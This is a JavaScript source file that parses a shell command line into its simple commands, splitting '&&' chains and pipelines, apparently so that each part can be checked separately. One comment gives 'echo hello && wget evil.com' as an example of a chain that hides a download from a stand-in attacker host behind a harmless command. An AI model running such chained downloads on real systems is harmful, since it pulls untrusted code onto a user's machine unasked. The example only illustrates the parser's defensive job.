import { _ } from 'golgoth';
import { parse } from 'unbash';

export let __;

/**
 * Extract all simple commands from a command line
 * @param {string} commandLine - The command line to parse
 * @returns {Array<string>} Array of simple commands
 */
export function extractSimpleCommands(commandLine) {
  const ast = parse(commandLine);

  return _.chain(ast.commands)
    .map((statement) => {
      const command = statement.command;
      const commandType = command.type;

      // echo hello && wget evil.com
      // echo hello | grep world
      if (commandType === 'AndOr' || commandType === 'Pipeline') {
        return _.map(command.commands, (subCommand) =>
          __.extractText(commandLine, subCommand),
        );
      }

      // echo hello
      return __.extractText(commandLine, command);
    })
    .flatten()
    .thru((commands) => (commands.length > 0 ? commands : [commandLine]))
    .value();
}

__ = {
  /**
   * Extract command text from a node
   * @param {string} commandLine - The full command line
   * @param {object} node - The AST node to extract from
   * @returns {string} The command text without env var assignments
   */
  extractText(commandLine, node) {
    // Extract command text from after the ENV definition, until the end
    return commandLine.substring(node.name.pos, node.end);
  },
};
